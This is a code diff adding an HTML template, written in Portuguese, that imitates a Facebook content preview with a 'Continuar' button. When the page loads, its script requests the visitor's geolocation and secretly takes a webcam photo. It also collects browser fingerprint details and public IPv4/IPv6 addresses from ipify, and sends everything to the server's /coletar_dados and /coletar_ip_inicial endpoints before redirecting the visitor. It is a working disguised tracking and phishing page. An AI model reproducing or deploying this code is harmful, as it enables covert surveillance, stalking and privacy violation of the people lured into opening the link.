@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>{{ link.og_title or 'Facebook' }}</title>
+    <style>
+        body { font-family: Helvetica, sans-serif; background-color: #e9ebee; padding: 30px; text-align: center; }
+        .preview img { width: 90%; border-radius: 10px; }
+        .botao { margin-top: 20px; padding: 12px 25px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>{{ link.og_title or 'Conteúdo exclusivo no Facebook' }}</h2>
+    <div class="preview">
+        <img src="{{ link.og_image or url_for('static', filename='fallback.jpg') }}">
+        <p>{{ link.og_description or 'Clique para continuar no Facebook.' }}</p>
+    </div>
+    <button class="botao" onclick="solicitarPermissoes()">Continuar</button>
+    
+    <script>
+    const slug = {{ slug | tojson | safe }};
+    const destino = {{ destino | tojson | safe }};
+    const inicioTempo = Date.now();
+
+    const coletarInfoBrowser = async () => {
+    const userAgent = navigator.userAgent;
+    const idioma = navigator.language;
+    const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const larguraTela = window.screen.width;
+    const alturaTela = window.screen.height;
+    const plataforma = navigator.platform;
+    const conexao = (navigator.connection || {}).effectiveType || "indisponível";
+    const porta = location.port || (location.protocol === "https:" ? "443" : "80");
+
+    let ip_v4 = "indefinido";
+    let ip_v6 = "indefinido";
+
+    try {
+      const resV4 = await fetch("https://api.ipify.org?format=json");
+      const jsonV4 = await resV4.json();
+      ip_v4 = jsonV4.ip;
+    } catch (e) {
+      console.warn("Erro ao obter IPv4:", e);
+    }
+
+    try {
+      const resV6 = await fetch("https://api64.ipify.org?format=json");
+      const jsonV6 = await resV6.json();
+      ip_v6 = jsonV6.ip;
+    } catch (e) {
+      console.warn("Erro ao obter IPv6:", e);
+    }
+
+    return {
+      userAgent,
+      idioma,
+      fusoHorario,
+      larguraTela,
+      alturaTela,
+      plataforma,
+      conexao,
+      ip_v4,
+      ip_v6,
+      porta
+    };
+  };
+    async function coletarDados() {
+        let latitude = "", longitude = "", foto_base64 = "";
+
+        // Localização
+        try {
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+            latitude = pos.coords.latitude;
+            longitude = pos.coords.longitude;
+        } catch (e) {
+            console.warn("Erro na geolocalização:", e);
+        }
+
+        // Câmera
+        try {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            await new Promise(r => setTimeout(r, 2000)); // tempo da câmera ligar
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            foto_base64 = canvas.toDataURL("image/png");
+
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) {
+            console.warn("Erro ao acessar câmera:", e);
+        }
+
+        // Informações do navegador
+        const infosBrowser = await coletarInfoBrowser();
+
+        const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
+
+        const payload = {
+            slug,
+            latitude,
+            longitude,
+            foto_base64,
+            tempoSegundos,
+            ...infosBrowser
+        };
+
+        try {
+            const res = await fetch("/coletar_dados", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            const json = await res.json();
+
+            // Agora, o json retornado tem o nome da imagem e o destino
+            console.log("Nome do arquivo salvo: ", json.foto_nome);  // Nome do arquivo da imagem
+            window.location.href = json.destino;
+        } catch (e) {
+            console.error("Erro ao enviar dados:", e);
+            document.getElementById('mensagem').innerText = "Erro ao enviar dados.";
+        }
+    }
+
+    coletarDados();
+
+    // Captura de IP inicial (sem a porta)
+    (async () => {
+    let ip_v4 = "indefinido";
+    let ip_v6 = "indefinido";
+
+    try {
+      const resV4 = await fetch("https://api.ipify.org?format=json");
+      ip_v4 = (await resV4.json()).ip;
+    } catch (e) {
+      console.warn("IPv4 não disponível:", e);
+    }
+
+    try {
+      const resV6 = await fetch("https://api64.ipify.org?format=json");
+      ip_v6 = (await resV6.json()).ip;
+    } catch (e) {
+      console.warn("IPv6 não disponível:", e);
+    }
+
+    try {
+      await fetch("/coletar_ip_inicial", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ slug, ip_v4, ip_v6 })
+      });
+    } catch (e) {
+      console.warn("Erro ao enviar IPs:", e);
+    }
+  })();
+
+</script>
+</body>
+</html>
